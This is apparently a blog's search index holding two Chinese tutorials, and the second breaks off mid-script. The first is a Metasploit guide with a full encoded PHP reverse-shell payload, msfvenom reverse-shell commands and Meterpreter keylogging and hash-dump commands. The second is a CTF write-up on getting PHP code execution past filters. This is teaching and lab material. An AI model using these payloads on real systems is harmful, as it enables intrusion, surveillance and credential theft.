<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>msfMetasploit使用</title>
      <link href="/2024/01/13/msfMetasploit%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/01/13/msfMetasploit%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是metasploit"><a href="#什么是metasploit" class="headerlink" title="#什么是metasploit"></a>#什么是metasploit</h1><p>Metasploit是使用最广泛的开发框架。Metasploit 是一个强大的工具，可以支持渗透测试的所有阶段，从信息收集到后利用</p><p>metasploit有两个版本，分别是：</p><ul><li><strong>Metasploit Pro</strong>：商业版本，有助于任务的自动化和管理。该版本有图形用户界面（ GUI）。</li><li><strong>Metasploit Framework</strong>：从命令行运行的开源版本。</li></ul><p>Metasploit框架是一组工具，可用于信息收集、扫描、利用、利用开发、后利用等。虽然 Metasploit 框架的主要用途集中在渗透测试领域，但它对于漏洞研究和漏洞利用开发也很有用。</p><p>Metasploit框架的主要组件可概括如下：</p><ul><li><strong>msfconsole</strong>：主命令行界面。</li><li><strong>模块</strong>：支持模块，例如漏洞利用、扫描器、有效负载等。</li><li><strong>工具</strong>：有助于漏洞研究、漏洞评估或渗透测试的独立工具。其中一些工具包括msfvenom、pattern_create 和pattern_offset。我们将在本模块中介绍 msfvenom，但pattern_create 和pattern_offset 是在漏洞利用开发中有用的工具</li></ul><p><strong>在kali中的&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules下可以看到各种工具</strong></p><h2 id="启动控制台"><a href="#启动控制台" class="headerlink" title="启动控制台"></a>启动控制台</h2><p>msfconsole就可以启动控制台了，命令行和linux一样</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202401131739368.png"></p><p>Msfconsole由上下文管理；这意味着除非设置为全局变量，否则如果更改决定使用的模块，所有参数设置都将丢失。（setg设置后为全局变量）</p><h1 id="信息收集模块"><a href="#信息收集模块" class="headerlink" title="信息收集模块"></a>信息收集模块</h1><h2 id="端口扫描模块"><a href="#端口扫描模块" class="headerlink" title="端口扫描模块"></a>端口扫描模块</h2><p>在msf中可以使用nmap进行扫描，也可以搜索相关的端口扫描模块</p><p>search portscan</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202401151425153.png"></p><p>show options 查看相关的配置</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202401151428930.png"></p><ul><li><strong>CONCURRENCY：</strong>同时扫描的目标数量。</li><li><strong>PORTS：</strong>要扫描的端口范围。请注意，此处的 1-1000 与使用默认配置的 Nmap 不同。Nmap 将扫描最常用的 1000 个端口，而 Metasploit 将扫描从 1 到 10000 的端口号。</li><li><strong>RHOTS：</strong>要扫描的目标或目标网络。</li><li><strong>THREADS：</strong>将同时使用的线程数。更多线程将导致更快的扫描。</li></ul><h2 id="UDP服务识别"><a href="#UDP服务识别" class="headerlink" title="UDP服务识别"></a>UDP服务识别</h2><p><code>scanner/discovery/udp_sweep</code> 模块将允许您快速识别通过 UDP（用户数据报协议）运行的服务。如下所示，该模块不会对所有可能的 UDP 服务进行广泛扫描，但确实提供了一种快速方法来识别 DNS 或 NetBIOS 等服务。</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/discovery/udp_sweep) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Sending 13 probes to 10.10.12.229-&gt;10.10.12.229 (1 hosts)</span><br><span class="line">[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :JON-PC::U :WORKGROUP::G :WORKGROUP::U :__MSBROWSE__::G :02:ce:59:27:c8:e3)</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/discovery/udp_sweep) &gt;</span><br></pre></td></tr></table></figure><h2 id="SMB-服务识别枚举模块"><a href="#SMB-服务识别枚举模块" class="headerlink" title="SMB 服务识别枚举模块"></a>SMB 服务识别枚举模块</h2><p>在企业网络中尤其有用 <code>smb_enumshares</code> ，<code>smb_version</code></p><p>smb_enumshares  枚举模块</p><p>smb_version 版本探测服务</p><h2 id="msf-数据库"><a href="#msf-数据库" class="headerlink" title="msf 数据库"></a>msf 数据库</h2><p>metasploit 具有数据库功能，可以简化项目管理并避免设置参数值时可能出现的混乱</p><p>您首先需要启动 PostgreSQL 数据库，Metasploit 将通过以下命令使用该数据库： </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start postgresql</span><br></pre></td></tr></table></figure><p>然后您需要使用该<code>msfdb init</code>命令初始化 Metasploit 数据库。 </p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202401151445521.png"></p><p>进入msf 输入 <code>db_status</code> 查看当前状态</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202401151446445.png"></p><p>数据库功能将允许您创建工作区来隔离不同的项目。首次启动时，您应该位于默认工作区中。您可以使用该<code>workspace</code> 命令列出可用的工作区。 </p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202401151448093.png"></p><p>您可以分别使用该<code>-a</code>参数添加工作区或使用该参数删除工作区<code>-d</code></p><p>您还会注意到新的数据库名称以红色打印，以<code>*</code>符号开头。</p><p>您可以使用工作区命令在工作区之间导航，只需键入<code>workspace</code>后跟所需的工作区名称即可。 </p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202401151449879.png"></p><p>您可以使用该 <code>workspace -h</code>命令列出该<code>workspace</code> 命令的可用选项。 </p><p>与常规 Metasploit 用法不同，一旦使用数据库命令启动 Metasploit <code>help</code> ，您将显示数据库后端命令菜单。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">Command           Description</span><br><span class="line">-------           -----------</span><br><span class="line">analyze           Analyze database information about a specific address or address range</span><br><span class="line">db_connect        Connect to an existing data service</span><br><span class="line">db_disconnect     Disconnect from the current data service</span><br><span class="line">db_export         Export a file containing the contents of the database</span><br><span class="line">db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">db_nmap           Executes nmap and records the output automatically</span><br><span class="line">db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)</span><br><span class="line">db_remove         Remove the saved data service entry</span><br><span class="line">db_save           Save the current data service connection as the default to reconnect on startup</span><br><span class="line">db_status         Show the current data service status</span><br><span class="line">hosts             List all hosts in the database</span><br><span class="line">loot              List all loot in the database</span><br><span class="line">notes             List all notes in the database</span><br><span class="line">services          List all services in the database</span><br><span class="line">vulns             List all vulnerabilities in the database</span><br><span class="line">workspace         Switch between database workspaces</span><br></pre></td></tr></table></figure><p>使用db_nmap 的结果将保存到数据库中</p><p>使用<code>hosts</code> 主机信息  <code>services</code> 查看相关版本和开放端口</p><h1 id="漏洞扫描模块"><a href="#漏洞扫描模块" class="headerlink" title="漏洞扫描模块"></a>漏洞扫描模块</h1><h2 id="vnc扫描模块"><a href="#vnc扫描模块" class="headerlink" title="vnc扫描模块"></a>vnc扫描模块</h2><p>如果你使用信息收集收集到了开放了vnc服务则可以使用  <code>use auxiliary/scanner/vnc/</code></p><p><code>vnc_login</code> 模块可以帮助我们找到VNC服务的登录详细信息。</p><p>您可以使用该命令搜索漏洞利用<code>search</code> 程序，使用该命令获取有关该漏洞利用程序的更多信息<code>info</code> ，并使用 启动该漏洞利用程序<code>exploit</code>。虽然过程本身很简单，但请记住，成功的结果取决于对目标系统上运行的服务的透彻理解。</p><p>大多数漏洞利用都会有预设的默认负载。但是，您始终可以使用该<code>show payloads</code>命令列出可用于该特定漏洞的其他命令。</p><p>一旦决定了有效负载，您就可以使用该<code>set payload</code>命令进行选择。</p><p>打开会话后，您可以使用将其置于后台<code>CTRL+Z</code>或使用将其中止<code>CTRL+C</code>。当同时处理多个目标或使用不同的漏洞利用和&#x2F;或 shell 处理同一目标时，后台会话将非常有用。</p><p>该<code>sessions</code> 命令将列出所有活动会话。该 <code>sessions</code> 命令支持许多选项，可帮助您更好地管理会话。</p><p>使用<code>sessions -i</code>后跟会话 ID 的命令与任何现有会话进行交互。</p><h1 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h1><p>Msfvenom 取代了 Msfpayload 和 Msfencode，允许您生成有效负载。</p><p>Msfvenom 将允许您访问 Metasploit 框架中可用的所有有效负载。Msfvenom 允许您为许多不同的目标系统（Apple、Windows、Android、Linux 等）创建多种不同格式（PHP、exe、dll、elf 等）的有效负载。</p><p><code>msfvenom --list formats</code>命令可用于列出支持的输出格式</p><h3 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h3><p>与某些观点相反，编码器的目的并不是绕过目标系统上安装的防病毒软件。顾名思义，它们对有效负载进行编码。虽然它可以有效对抗某些防病毒软件，但使用现代混淆技术或学习方法注入 shellcode 是解决该问题的更好方法。下面的例子展示了encoding的用法（带有<code>-e</code>参数）。PHP版本的Meterpreter是用Base64编码的，输出格式是<code>raw</code>.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No arch selected, selecting arch: php from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of php/base64</span><br><span class="line">php/base64 succeeded with size 1507 (iteration=0)</span><br><span class="line">php/base64 chosen with final size 1507</span><br><span class="line">Payload size: 1507 bytes</span><br><span class="line">eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));</span><br><span class="line">root@ip-10-10-186-44:~#</span><br></pre></td></tr></table></figure><p>Linux可执行和可链接格式 (elf)<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</code><br>.elf 格式与 Windows 中的 .exe 格式相当。这些是 Linux 的可执行文件。但是，您可能仍然需要确保它们在目标计算机上具有可执行权限。例如，一旦目标计算机上有 shell.elf 文件，请使用 chmod +x shell.elf 命令授予可执行权限。完成后，您可以通过在目标计算机命令行上键入 .&#x2F;shell.elf 来运行此文件。</p><p>Windows<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</code></p><p>PHP<br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</code></p><p>ASP<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</code></p><p>Python<br><code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py</code></p><p>使用msf进行文件上传并反弹shell</p><p>生成一个php 反弹shell</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202401151526819.png"></p><p>使用 Multi Handler 来接收传入的连接。该模块可以与该命令一起使用<code>use exploit/multi/handler</code>。</p><p>多处理程序支持所有Metasploit有效负载，并且可用于 Meterpreter 以及常规 shell。</p><p>要使用该模块，我们需要设置有效负载值（<code>php/reverse_php</code>在本例中）、LHOST 和 LPORT 值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/reverse_php</span><br><span class="line">payload =&gt; php/reverse_php</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 10.0.2.19</span><br><span class="line">lhost =&gt; 10.0.2.19</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 7777</span><br><span class="line">lport =&gt; 7777</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/reverse_php):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.0.2.19        yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  7777             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure><p>输入run 后上传文件即可</p><h1 id="Meterpreter简介"><a href="#Meterpreter简介" class="headerlink" title="Meterpreter简介"></a>Meterpreter简介</h1><p>Meterpreter 是一个 Metasploit 有效负载，通过许多有价值的组件支持渗透测试过程。Meterpreter 将在目标系统上运行，并充当命令和控制架构中的代理。您将与目标操作系统和文件进行交互，并使用 Meterpreter 的专用命令。</p><p>Meterpreter 有很多版本，根据目标系统提供不同的功能。</p><p><strong>Meterpreter 是如何工作的？</strong></p><p>Meterpreter 在目标系统上运行，但未安装。它在内存中运行，不会将自身写入目标上的磁盘。此功能旨在避免在防病毒扫描期间被检测到。默认情况下，大多数防病毒软件将扫描磁盘上的新文件（例如，当您从互联网下载文件时） Meterpreter 在内存（RAM - 随机存取存储器）中运行，以避免将文件写入到磁盘上目标系统（例如meterpreter.exe）。这样，Meterpreter 将被视为一个进程，并且在目标系统上没有文件。</p><p>Meterpreter 还旨在通过与运行 Metasploit 的服务器（通常是您的攻击机器）进行加密通信，避免被基于网络的 IPS（入侵防御系统）和 IDS（入侵检测系统）解决方案检测到。如果目标组织不解密和检查进出本地网络的加密流量（例如HTTPS），IPS 和IDS 解决方案将无法检测其活动。</p><p>虽然 Meterpreter 被主要防病毒软件识别，但此功能提供了一定程度的隐蔽性。</p><p>使用了该 <code>msfvenom --list payloads</code> 命令并 grep“meterpreter”有效负载（添加<code>| grep meterpreter</code>到命令行）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ip-10-10-186-44:~# msfvenom --list payloads | grep meterpreter</span><br><span class="line">    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP</span><br><span class="line">    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS</span><br><span class="line">    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager</span><br><span class="line">    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell</span><br><span class="line">    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell</span><br><span class="line">    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell</span><br><span class="line">    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection</span><br><span class="line">    java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP</span><br><span class="line">    java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS</span><br><span class="line">    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager</span><br><span class="line">    linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)</span><br><span class="line">    linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection</span><br><span class="line">    linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker [...]</span><br></pre></td></tr></table></figure><p>核心命令</p><ul><li><code>background</code>：当前会话的背景</li><li><code>exit</code>：终止Meterpreter会话</li><li><code>guid</code>：获取会话GUID（全局唯一标识符）</li><li><code>help</code>：显示帮助菜单</li><li><code>info</code>：显示Post模块的信息</li><li><code>irb</code>：在当前会话上打开交互式 Ruby shell</li><li><code>load</code>：加载一个或多个 Meterpreter 扩展</li><li><code>migrate</code>：允许您将 Meterpreter 迁移到另一个进程</li><li><code>run</code>：执行Meterpreter脚本或Post模块</li><li><code>sessions</code>：快速切换到另一个会话</li></ul><p>文件系统命令</p><ul><li><code>cd</code>: 将更改目录</li><li><code>ls</code>：将列出当前目录中的文件（dir也可以）</li><li><code>pwd</code>：打印当前工作目录</li><li><code>edit</code>：将允许您编辑文件</li><li><code>cat</code>：将文件的内容显示到屏幕上</li><li><code>rm</code>：将删除指定文件</li><li><code>search</code>：将搜索文件</li><li><code>upload</code>：将上传文件或目录</li><li><code>download</code>：将下载文件或目录</li></ul><p>联网命令</p><ul><li><code>arp</code>：显示主机ARP（地址解析协议）缓存</li><li><code>ifconfig</code>：显示目标系统上可用的网络接口</li><li><code>netstat</code>：显示网络连接情况</li><li><code>portfwd</code>：将本地端口转发到远程服务</li><li><code>route</code>：允许查看和修改路由表</li></ul><p>系统命令</p><ul><li><code>clearev</code>：清除事件日志</li><li><code>execute</code>：执行命令</li><li><code>getpid</code>：显示当前进程标识符</li><li><code>getuid</code>：显示 Meterpreter 正在运行的用户</li><li><code>kill</code>: 终止一个进程</li><li><code>pkill</code>：按名称终止进程</li><li><code>ps</code>：列出正在运行的进程</li><li><code>reboot</code>：重新启动远程计算机</li><li><code>shell</code>：进入系统命令 shell</li><li><code>shutdown</code>：关闭远程计算机</li><li><code>sysinfo</code>：获取远程系统的信息，例如OS</li></ul><p>其他命令（这些命令将在帮助菜单中的不同菜单类别下列出）</p><ul><li><code>idletime</code>：返回远程用户空闲的秒数</li><li><code>keyscan_dump</code>：转储击键缓冲区</li><li><code>keyscan_start</code>：开始捕获击键</li><li><code>keyscan_stop</code>：停止捕获击键</li><li><code>screenshare</code>：允许您实时观看远程用户的桌面</li><li><code>screenshot</code>：抓取交互式桌面的屏幕截图</li><li><code>record_mic</code>：从默认麦克风录制音频 X 秒</li><li><code>webcam_chat</code>：开始视频聊天</li><li><code>webcam_list</code>：列出网络摄像头</li><li><code>webcam_snap</code>：从指定的网络摄像头拍摄快照</li><li><code>webcam_stream</code>：播放指定网络摄像头的视频流</li><li><code>getsystem</code>：尝试将您的权限提升到本地系统的权限</li><li><code>hashdump</code>：转储SAM数据库的内容</li></ul><p>迁移（migrate）到另一个进程将有助于 Meterpreter 与其交互。例如，如果您看到目标上运行着一个文字处理器（例如 word.exe、notepad.exe 等），您可以迁移到它并开始捕获用户发送到此进程的击键。某些 Meterpreter 版本将为您提供<code>keyscan_start</code>、 <code>keyscan_stop</code>和<code>keyscan_dump</code>命令选项，使 Meterpreter 充当键盘记录器。迁移到另一个进程也可以帮助您获得更稳定的 Meterpreter 会话。</p><p>要迁移到任何进程，您需要键入 migrate 命令，后跟所需目标进程的 PID。下面的示例显示 Meterpreter 迁移到进程 ID 716。hashdump查看哈希值</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfRCE篇</title>
      <link href="/2023/12/07/ctfRCE%E7%AF%87/"/>
      <url>/2023/12/07/ctfRCE%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-RCE"><a href="#CTF-RCE" class="headerlink" title="# CTF RCE"></a># CTF RCE</h1><h2 id="常见CTF-RCE类型"><a href="#常见CTF-RCE类型" class="headerlink" title="常见CTF RCE类型"></a>常见CTF RCE类型</h2><ol><li>无参数类型</li><li>无字母类型绕过(异或，自增，取反)</li><li>关键字绕过</li></ol><h3 id="无字母类型-取反绕过"><a href="#无字母类型-取反绕过" class="headerlink" title="无字母类型(取反绕过)"></a>无字母类型(取反绕过)</h3><p>例题：</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312072248710.png"></p><p>代码中 异或 和字母都被过滤掉了 这种情况下可以使用取反来绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是整个取反行不通，看了下评论区说是括号干扰。</p><p>只能函数和参数分开取反</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先用这个查看 跟下有没有flag文件(一般flag都在根下)</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312072316272.png"></p><p>这里要用括号然后再用取反符还原即可。看见了flag文件</p><p>再把上面的代码改下即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;cat /flllllaaaaaaggggggg&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312072319920.png"></p><p>附上大佬的取反脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312072325409.png"></p><h3 id="无字母RCE-异或"><a href="#无字母RCE-异或" class="headerlink" title="无字母RCE 异或"></a>无字母RCE 异或</h3><p>在php中两个字符异或后还是字符。通过这样可以构造rce（因本人太菜。搭建的环境用不了只能借助其他大佬的图）</p><p>核心代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的核心代码过滤了字母和数字</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312082223695.png"></p><p>@^”&#x3D;&#x3D;b(转为二进制 相同为0不同为1)  通过这种办法再进行url编码</p><p> 附上一个php异或脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="built_in">input</span>(<span class="string">&quot;Input key:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        result=i^j</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(result) <span class="keyword">is</span> key ):</span><br><span class="line">            